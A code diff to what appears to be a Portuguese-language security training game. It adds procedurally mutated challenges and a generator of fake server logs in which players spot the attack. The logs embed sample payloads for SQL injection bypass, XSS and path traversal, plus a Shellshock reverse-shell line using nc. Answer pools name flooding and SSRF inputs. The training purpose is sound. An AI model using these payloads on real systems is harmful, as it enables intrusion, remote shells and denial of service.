@@ -64,13 +64,29 @@ class ProceduralAI {
         }
     }
 
-    // CORE: Procedural Challenge Generation
     generateChallenge(difficulty = 'logica', categoryOverride = null) {
         const cat = categoryOverride || this.weightedCategory();
-        const template = this.selectTemplate(cat, difficulty);
-        if (!template) return this.generateFallback(cat, difficulty);
         
-        const challenge = this.populateTemplate(template, cat, difficulty);
+        let challenge;
+        const rand = Math.random();
+        
+        if (rand < 0.3) {
+            // 30% chance for Log Analysis
+            challenge = this.generateLogChallenge(cat, difficulty);
+        } else if (rand < 0.7) {
+            // 40% chance for Procedural/Mutated Code
+            challenge = this.generateProceduralTemplate(cat, difficulty);
+        } else {
+            // 30% chance for Classic Template
+            const template = this.selectTemplate(cat, difficulty);
+            if (!template) {
+                challenge = this.generateFallback(cat, difficulty);
+            } else {
+                challenge = this.populateTemplate(template, cat, difficulty);
+            }
+        }
+        
+        if (!challenge) challenge = this.generateFallback(cat, difficulty);
         
         // Adaptive difficulty based on player stats
         challenge.adaptiveLevel = this.calculateAdaptiveLevel(cat);
@@ -79,6 +95,91 @@ class ProceduralAI {
         
         this.usedChallenges.add(challenge.id);
         return challenge;
+    }
+
+    generateProceduralTemplate(cat, diff) {
+        const template = this.selectTemplate(cat, diff);
+        if (!template) return null;
+        
+        let mutatedChallenge = { ...template };
+        mutatedChallenge.id = `proc-${cat}-${Date.now()}`;
+        mutatedChallenge.category = cat;
+        mutatedChallenge.difficulty = diff;
+        
+        const companies = ['CyberCorp', 'GlobalBank', 'TechNova', 'HealthPlus', 'FinStream', 'GovSys'];
+        const variables = ['user_id', 'account_num', 'email_address', 'session_token', 'profile_id', 'client_id'];
+        const servers = ['Apache/2.4.51', 'Nginx/1.18.0', 'IIS/10.0', 'Tomcat/9.0'];
+        
+        const company = companies[Math.floor(Math.random() * companies.length)];
+        const variable = variables[Math.floor(Math.random() * variables.length)];
+        const server = servers[Math.floor(Math.random() * servers.length)];
+        
+        // Mutate description
+        mutatedChallenge.description = `[ALVO: ${company} - Servidor: ${server}] ` + mutatedChallenge.description;
+        
+        // Mutate code
+        if (mutatedChallenge.vulnerableCode) {
+            mutatedChallenge.vulnerableCode = mutatedChallenge.vulnerableCode.replace(/id|username|password/gi, variable);
+            // Randomly switch quotes to break pattern recognition
+            if (Math.random() > 0.5 && !mutatedChallenge.vulnerableCode.includes('`')) {
+                mutatedChallenge.vulnerableCode = mutatedChallenge.vulnerableCode.replace(/'/g, '"');
+                if (mutatedChallenge.solution && mutatedChallenge.solution.includes("'")) {
+                    mutatedChallenge.solution = mutatedChallenge.solution.replace(/'/g, '"');
+                }
+            }
+        }
+        
+        return mutatedChallenge;
+    }
+
+    generateLogChallenge(cat, diff) {
+        const companies = ['CyberCorp', 'GlobalBank', 'TechNova', 'HealthPlus', 'FinStream'];
+        const company = companies[Math.floor(Math.random() * companies.length)];
+        const attackerIP = `185.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
+        
+        let logLines = [];
+        let solution = "";
+        let desc = `A equipe SOC da ${company} detectou anomalias nos logs do servidor. Analise o trecho de log e identifique o vetor de ataque.`;
+        
+        // Generate normal logs
+        for(let i=0; i<3; i++) {
+            logLines.push(`[INFO] 192.168.1.${10+i} - - "GET /index.html HTTP/1.1" 200 1024`);
+        }
+        
+        // Inject attack log
+        if (cat === 'injection' || cat === 'api_security') {
+            logLines.push(`[WARN] ${attackerIP} - - "GET /login?user=admin%27%20OR%20%271%27%3D%271 HTTP/1.1" 500 405`);
+            solution = "SQL Injection (Authentication Bypass)";
+        } else if (cat === 'xss') {
+            logLines.push(`[WARN] ${attackerIP} - - "GET /search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E HTTP/1.1" 200 5000`);
+            solution = "Reflected XSS";
+        } else if (cat === 'lfi_rfi') {
+            logLines.push(`[WARN] ${attackerIP} - - "GET /download.php?file=../../../../etc/passwd HTTP/1.1" 200 1204`);
+            solution = "Local File Inclusion (Path Traversal)";
+        } else if (cat === 'rce') {
+            logLines.push(`[WARN] ${attackerIP} - - "POST /api/upload HTTP/1.1" 200 - User-Agent: "() { :;}; /bin/bash -c 'nc -e /bin/sh 10.0.0.1 4444'"`);
+            solution = "Remote Code Execution (Shellshock)";
+        } else {
+            logLines.push(`[WARN] ${attackerIP} - - "GET /admin_panel HTTP/1.1" 401 300`);
+            logLines.push(`[WARN] ${attackerIP} - - "POST /admin_panel/login HTTP/1.1" 401 300`);
+            logLines.push(`[WARN] ${attackerIP} - - "POST /admin_panel/login HTTP/1.1" 401 300`);
+            logLines.push(`[WARN] ${attackerIP} - - "POST /admin_panel/login HTTP/1.1" 200 4500`);
+            solution = "Brute Force Authentication";
+        }
+        
+        // Shuffle logs
+        const attackLine = logLines.pop();
+        logLines.splice(Math.floor(Math.random() * logLines.length), 0, attackLine);
+        
+        return {
+            id: `log-${cat}-${Date.now()}`,
+            category: 'log_analysis', // Force distractor category
+            difficulty: diff,
+            description: desc,
+            code: logLines.join("\\n"),
+            solution: solution,
+            exploitType: "log_analysis"
+        };
     }
 
     // Bridge for offline.js (Refactored for efficiency)
@@ -492,7 +593,8 @@ class ProceduralAI {
             api_security: ["Bearer token123", "Authorization: Basic Og==", "X-Admin: true", "api_key=test"],
             network_hacking: ["nmap -sS", "ping -f", "hping3 --flood", "netdiscover -r 192.168.1.0/24"],
             ssrf: ["http://localhost:80", "file:///etc/hosts", "gopher://localhost:70", "http://127.0.0.1:22"],
-            lfi_rfi: ["/var/log/apache2/access.log", "C:\\Windows\\win.ini", "../../../.env", "/proc/self/environ"]
+            lfi_rfi: ["/var/log/apache2/access.log", "C:\\Windows\\win.ini", "../../../.env", "/proc/self/environ"],
+            log_analysis: ["DDoS Attack (UDP Flood)", "Phishing via Email", "Port Scanning (Nmap)", "Privilege Escalation", "Zero-Day Exploit", "DNS Exfiltration", "Cross-Site Scripting (XSS)"]
         };
         return pools[category] || ["Exploit Genérico #1", "Exploit Genérico #2", "Exploit Genérico #3", "Exploit Genérico #4"];
     }
